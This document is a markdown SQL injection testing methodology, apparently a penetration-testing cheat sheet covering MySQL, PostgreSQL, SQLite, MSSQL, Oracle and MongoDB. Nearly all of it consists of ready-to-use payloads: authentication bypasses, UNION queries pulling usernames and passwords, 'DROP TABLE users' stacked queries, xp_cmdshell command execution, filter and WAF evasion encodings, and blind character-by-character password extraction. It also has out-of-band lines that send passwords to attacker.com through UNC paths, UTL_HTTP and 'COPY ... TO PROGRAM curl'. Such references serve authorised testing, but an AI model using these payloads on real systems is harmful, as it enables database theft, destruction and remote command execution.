# SQL Injection Testing Methodology

## Quick Reference

**Most Common Payloads:**
```
' OR '1'='1
" OR "1"="1
1 OR 1=1
1' OR '1'='1'--
admin'--
' UNION SELECT NULL--
```

**Blind SQLi Detection:**
```
' AND '1'='1
' AND '1'='2
' AND SLEEP(5)--
1 AND 1=1
1 AND 1=2
```

---

## Injection Context Patterns

### Pattern 1: Value Injection (Quoted Context)

**Query Pattern:** `WHERE name = '${input}'`

**Detection:**
```
'           → SQL error
''          → No error (escaped quote)
' OR '1'='1 → Returns all results
```

**Payloads:**
```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
' OR 1=1--
' OR 'a'='a
```

**UNION Extraction:**
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT 1,2,3,4,5--
```

### Pattern 2: WHERE Clause Body Injection (CRITICAL)

**Query Pattern:** `WHERE ${input}` (entire clause is user-controlled)

This pattern is commonly missed! The input directly becomes the WHERE clause.

**Detection:**
```
1=1         → Returns all results
1=2         → Returns no results
name='test' → Works as normal search
```

**Payloads:**
```sql
1=1
1=1--
1=1 OR 1=1
name LIKE '%admin%'
1=1 UNION SELECT NULL,NULL,NULL--
1=1; DROP TABLE users--
```

**Real Example:**
```
GET /api/products?search=1=1
→ Query: SELECT * FROM products WHERE 1=1
→ Returns ALL products
```

### Pattern 3: Numeric Parameter Injection (Unquoted Context)

**Query Pattern:** `WHERE id = ${input}`

**Detection:**
```
1           → Normal result
1 AND 1=1   → Same result
1 AND 1=2   → No result
```

**Payloads:**
```sql
1 OR 1=1
1 UNION SELECT NULL
1; DROP TABLE users
1 AND (SELECT COUNT(*) FROM users) > 0
```

### Pattern 4: ORDER BY / LIMIT Injection

**Query Pattern:** `ORDER BY ${input}`

**Detection:**
```
1           → Sorts by first column
2           → Sorts by second column
999         → Error (column doesn't exist)
```

**Payloads:**
```sql
1
(SELECT 1 FROM users)
IF(1=1,name,id)
CASE WHEN (1=1) THEN name ELSE id END
```

### Pattern 5: INSERT/UPDATE Statement Injection

**Query Pattern:** `INSERT INTO logs (user, action) VALUES ('${user}', '${action}')`

**Payloads:**
```sql
test', (SELECT password FROM users LIMIT 1))--
test'); DROP TABLE users;--
```

### Pattern 6: LIKE Clause Injection

**Query Pattern:** `WHERE name LIKE '%${input}%'`

**Payloads:**
```sql
%' OR '1'='1
%' UNION SELECT NULL--
%'; DROP TABLE users--
_       → Wildcard (single char)
%       → Wildcard (any chars)
```

---

## Database-Specific Payloads

### MySQL

```sql
-- Comments
--
#
/**/

-- Version
SELECT @@version
SELECT VERSION()

-- Current user
SELECT USER()
SELECT CURRENT_USER()

-- Database name
SELECT DATABASE()

-- List tables
SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- String concatenation
CONCAT('a','b')
'a' 'b'

-- Time-based blind
SLEEP(5)
BENCHMARK(10000000,SHA1('test'))

-- Conditional
IF(condition, true_value, false_value)
CASE WHEN condition THEN true_value ELSE false_value END

-- Stacked queries (if enabled)
; DROP TABLE users;--
```

### PostgreSQL

```sql
-- Comments
--
/**/

-- Version
SELECT version()

-- Current user
SELECT current_user
SELECT user

-- Database name
SELECT current_database()

-- List tables
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- String concatenation
'a' || 'b'
CONCAT('a','b')

-- Time-based blind
pg_sleep(5)

-- Conditional
CASE WHEN condition THEN true_value ELSE false_value END

-- Stacked queries
; DROP TABLE users;--
```

### SQLite

```sql
-- Comments
--
/**/

-- Version
SELECT sqlite_version()

-- List tables
SELECT name FROM sqlite_master WHERE type='table'

-- List columns
PRAGMA table_info(users)

-- String concatenation
'a' || 'b'

-- Time-based (limited)
-- SQLite doesn't have SLEEP, use heavy computation instead

-- Conditional
CASE WHEN condition THEN true_value ELSE false_value END
```

### Microsoft SQL Server

```sql
-- Comments
--
/**/

-- Version
SELECT @@VERSION

-- Current user
SELECT USER_NAME()
SELECT SYSTEM_USER

-- Database name
SELECT DB_NAME()

-- List tables
SELECT name FROM sysobjects WHERE xtype='U'

-- List columns
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')

-- String concatenation
'a' + 'b'
CONCAT('a','b')

-- Time-based blind
WAITFOR DELAY '0:0:5'

-- Conditional
IF condition true_value ELSE false_value
CASE WHEN condition THEN true_value ELSE false_value END

-- Stacked queries
; EXEC xp_cmdshell 'whoami';--

-- Error-based
CONVERT(int, (SELECT TOP 1 username FROM users))
```

### Oracle

```sql
-- Comments
--
/**/

-- Version
SELECT banner FROM v$version WHERE ROWNUM=1
SELECT version FROM v$instance

-- Current user
SELECT USER FROM dual

-- Database name
SELECT ora_database_name FROM dual

-- List tables
SELECT table_name FROM all_tables

-- List columns
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- String concatenation
'a' || 'b'
CONCAT('a','b')

-- Time-based blind
DBMS_PIPE.RECEIVE_MESSAGE('x',5)

-- Conditional
CASE WHEN condition THEN true_value ELSE false_value END
DECODE(condition, comparison, true_value, false_value)
```

---

## NoSQL Injection (MongoDB)

### JSON Injection

**Query Pattern:** `db.users.find({user: '${input}'})`

**Payloads:**
```javascript
// Authentication bypass
{"$gt": ""}
{"$ne": ""}
{"$regex": ".*"}

// In URL parameters
user[$ne]=admin&password[$ne]=

// JSON body
{"user": {"$gt": ""}, "password": {"$gt": ""}}
```

### Operator Injection

```javascript
// $where injection
{"$where": "this.password == 'password'"}
{"$where": "sleep(5000)"}

// $regex for enumeration
{"user": {"$regex": "^a"}}
{"user": {"$regex": "^ad"}}
{"user": {"$regex": "^adm"}}
```

---

## Filter/WAF Bypass Techniques

### Case Manipulation
```sql
SeLeCt
uNiOn SeLeCt
```

### Comment Insertion
```sql
UN/**/ION SEL/**/ECT
UNI%0AON SEL%0AECT
```

### URL Encoding
```
%27 = '
%22 = "
%2527 = %27 (double encoding)
```

### Unicode/Alternative Encodings
```
ʼ (U+02BC) instead of '
％27 (fullwidth)
```

### Whitespace Alternatives
```sql
UNION%09SELECT
UNION%0ASELECT
UNION%0BSELECT
UNION%0CSELECT
UNION%0DSELECT
UNION/**/SELECT
UNION(SELECT)
```

### Keyword Alternatives
```sql
-- Instead of UNION SELECT
UNION ALL SELECT
UNION DISTINCT SELECT

-- Instead of OR
|| (double pipe)
```

### Null Byte Injection
```
%00' OR '1'='1
```

### HTTP Parameter Pollution
```
?id=1&id=' OR '1'='1
```

---

## Blind SQL Injection Techniques

### Boolean-Based Blind

```sql
-- MySQL
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--

-- PostgreSQL
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--

-- Extracting character by character
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
```

### Time-Based Blind

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF((SELECT SUBSTRING(username,1,1) FROM users)='a',SLEEP(5),0)--

-- PostgreSQL
'; SELECT pg_sleep(5);--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- MSSQL
'; WAITFOR DELAY '0:0:5';--
' AND IF 1=1 WAITFOR DELAY '0:0:5'--

-- Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)--
```

### Error-Based Blind

```sql
-- MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users)),1)--

-- MSSQL
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--

-- PostgreSQL
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

---

## Polyglot Payloads

These work across multiple contexts:

```sql
'/**/OR/**/1=1/**/--
"/**/OR/**/1=1/**/--
')/**/OR/**/('1'='1
"))/**/OR/**/1=1--
```

**Universal SQLi Test:**
```
'||(SELECT 1 FROM dual WHERE 1=1)||'
```

---

## Out-of-Band Extraction

### DNS Exfiltration

```sql
-- MySQL (Windows UNC)
SELECT LOAD_FILE(CONCAT('\\\\',password,'.attacker.com\\a'))

-- MSSQL
EXEC master..xp_dirtree '\\attacker.com\a'
SELECT * FROM OPENROWSET('SQLOLEDB','server=attacker.com;uid=x;pwd=x','SELECT 1')

-- Oracle
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM dual

-- PostgreSQL
COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/?data='||password
```

---

## Second-Order SQL Injection

SQL injection where payload is stored and executed later:

1. Register user with name: `admin'--`
2. Later, when profile is loaded: `SELECT * FROM users WHERE name='admin'--'`

**Detection:** Look for:
- User input stored in database
- Later queries that use stored data without sanitization

---

## Verification Checklist

1. **Confirm injection point exists:**
   - [ ] Single quote causes error or different behavior
   - [ ] Boolean conditions change results (1=1 vs 1=2)

2. **Determine database type:**
   - [ ] Test version queries for each DB
   - [ ] Check error messages for DB signatures

3. **Identify injection context:**
   - [ ] Quoted string context
   - [ ] Numeric context
   - [ ] WHERE clause body
   - [ ] ORDER BY context

4. **Prove data extraction:**
   - [ ] UNION SELECT to extract data
   - [ ] Error-based extraction
   - [ ] Blind extraction (boolean/time)

5. **Document evidence:**
   - [ ] Screenshot/response showing extracted data
   - [ ] Working payload
   - [ ] Affected endpoint and parameter
